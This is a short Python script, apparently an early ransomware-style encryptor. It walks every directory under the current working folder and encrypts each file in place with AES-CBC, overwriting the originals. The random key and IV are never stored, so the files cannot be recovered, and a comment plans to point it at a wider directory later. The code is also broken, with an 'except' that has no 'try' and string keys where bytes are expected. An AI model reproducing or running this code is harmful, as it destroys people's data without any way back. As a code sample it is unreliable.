import os,sys,random
from Crypto.Cipher import AES 
rootdir =  os.getcwd()# sets the directory to start from, later change this to where the program is stored
key = ''.join(str(random.randint(0,9)) for _ in range(16))# sets the key
iv = ''.join(str(random.randint(0,9)) for _ in range(16)) # sets the iv
mode = AES.MODE_CBC #aes mode is CBC
encryptor = AES.new(key, mode, IV=iv) # encrypt func
for folder, subs, files in os.walk(rootdir): #os walk, recursive 
    if "main.py" in files:
        files.remove("main.py")
    with open(os.path.join(folder, 'python-outfile.txt'), 'w') as dest: # this can be left in for testing
         for filename in files: # goes through each file
             with open(os.path.join(folder, filename), 'rb') as src: #allows the program to read the text in the file
                 t = src.read() #reads the text in the file
                 while len(t) % 16 != 0: # make it a multiple of 16 bytes
                     t = t + bytes([1]) #adds 1 byte
                 ciphertext = encryptor.encrypt(t) #encrypts the text
                 with open(os.path.join(folder, filename), 'wb') as tw: #allows the program to write to the file
                     tw.write(ciphertext) #overwrites the text
                 except Exception as e:
                     pass
